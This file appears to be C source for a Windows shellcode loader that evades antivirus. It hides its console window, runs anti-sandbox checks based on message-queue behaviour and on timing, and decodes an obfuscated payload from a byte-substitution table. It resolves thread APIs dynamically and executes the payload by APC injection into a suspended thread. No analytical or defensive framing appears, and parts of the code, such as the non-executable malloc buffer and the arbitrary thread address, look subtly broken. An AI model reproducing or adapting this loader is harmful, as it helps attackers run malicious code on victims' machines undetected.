
#include <stdio.h>
#include <windows.h>
#pragma comment(linker,"/subsystem:"windows" /entry:"mainCRTStartup"")	

typedef HANDLE (WINAPI* pCreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
);

typedef DWORD(WINAPI* pQueueUserAPC)(
	PAPCFUNC  pfnAPC,
	HANDLE    hThread,
	ULONG_PTR dwData
);

typedef DWORD (WINAPI* pResumeThread)(
	HANDLE hThread
);



    __attribute__((section(".text"))) DWORD random_dict_table[]={10, 168, 140, 91, 226, 60, 102, 76, 107, 184, 240, 34, 211, 128, 152, 94, 96, 161, 209, 146, 46, 79, 48, 117, 24, 169, 225, 216, 150, 106, 57, 97, 165, 141, 137, 241, 131, 136, 90, 88, 185, 16, 212, 2, 176, 250, 40, 195, 253, 243, 65, 196, 167, 175, 62, 129, 8, 85, 227, 153, 206, 67, 249, 166, 9, 83, 252, 202, 72, 178, 181, 192, 222, 20, 145, 7, 239, 74, 116, 109, 63, 71, 120, 147, 174, 242, 218, 101, 11, 164, 124, 224, 82, 87, 45, 163, 155, 126, 30, 44, 89, 84, 47, 125, 38, 5, 0, 220, 61, 190, 234, 201, 233, 255, 110, 25, 26, 69, 77, 244, 187, 228, 221, 215, 154, 143, 81, 51, 144, 75, 213, 205, 6, 231, 39, 135, 188, 223, 238, 32, 98, 14, 36, 100, 21, 56, 183, 148, 53, 138, 248, 193, 95, 68, 12, 33, 247, 132, 230, 133, 170, 86, 232, 123, 64, 236, 52, 245, 229, 18, 198, 251, 217, 113, 151, 13, 121, 4, 31, 199, 114, 58, 246, 70, 157, 35, 191, 3, 172, 78, 1, 149, 210, 19, 27, 93, 159, 103, 49, 208, 134, 130, 203, 179, 158, 156, 207, 66, 43, 22, 122, 139, 50, 194, 127, 200, 111, 189, 29, 237, 160, 54, 180, 108, 55, 119, 41, 235, 177, 80, 204, 104, 171, 42, 112, 17, 173, 186, 105, 115, 254, 197, 214, 28, 99, 118, 37, 73, 219, 59, 92, 15, 23, 182, 142, 162};
    __attribute__((section(".text"))) DWORD offset_table[]={172, 227, 96, 172, 78, 142, 119, 198, 192, 69, 225, 198, 111, 143, 211, 173, 22, 211, 245, 154, 211, 245, 243, 211, 183, 56, 211, 97, 139, 211, 221, 145, 21, 24, 23, 49, 100, 190, 18, 113, 26, 16, 211, 223, 142, 142, 211, 117, 5, 211, 101, 46, 82, 190, 110, 211, 77, 24, 211, 38, 139, 190, 227, 58, 166, 247, 211, 166, 211, 190, 138, 198, 113, 198, 71, 66, 188, 157, 71, 78, 75, 151, 206, 175, 190, 179, 227, 119, 249, 90, 142, 46, 23, 26, 211, 38, 142, 190, 227, 6, 211, 154, 129, 211, 38, 243, 190, 227, 211, 177, 211, 190, 162, 34, 153, 142, 243, 31, 47, 69, 56, 226, 42, 34, 168, 34, 213, 231, 254, 189, 141, 165, 92, 162, 196, 113, 113, 113, 34, 117, 177, 120, 97, 27, 4, 239, 135, 243, 142, 92, 162, 254, 113, 113, 113, 34, 117, 56, 231, 223, 223, 139, 50, 231, 127, 212, 20, 143, 231, 23, 239, 87, 180, 22, 248, 37, 250, 142, 0, 34, 158, 161, 113, 57, 177, 34, 213, 229, 120, 1, 255, 118, 136, 135, 243, 142, 92, 162, 152, 113, 113, 113, 231, 216, 82, 39, 139, 231, 31, 197, 87, 207, 231, 118, 87, 239, 239, 198, 248, 37, 250, 142, 0, 34, 58, 231, 39, 139, 139, 139, 231, 118, 65, 183, 155, 231, 180, 216, 79, 139, 231, 216, 99, 139, 6, 231, 68, 87, 223, 223, 198, 111, 37, 7, 142, 41, 34, 26, 198, 192, 92, 65, 126, 92, 113, 199, 198, 71, 229, 113, 57, 56};
    

int main()
{
        MSG msg;
        DWORD tc;
        PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
        if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                return 0;

        if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
                return 0;

        /* check timing of A/V sandbox... */
        tc = GetTickCount();
        Sleep(650);

        if (((GetTickCount() - tc) / 300) != 2)
                return 0;

	PCHAR lpBuffer = (PCHAR)malloc(sizeof(offset_table));

	for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = random_dict_table[offset_table[i]];
	}


	pCreateThread fCreateThread = (pCreateThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
	pQueueUserAPC fQueueUserAPC = (pQueueUserAPC)GetProcAddress(GetModuleHandleA("kernel32.dll"), "QueueUserAPC");
	pResumeThread fResumeThread = (pResumeThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");
	HANDLE hThread = fCreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xff111f, 0, CREATE_SUSPENDED, NULL);

	fQueueUserAPC((PAPCFUNC)lpBuffer, hThread, 0);
	fResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
    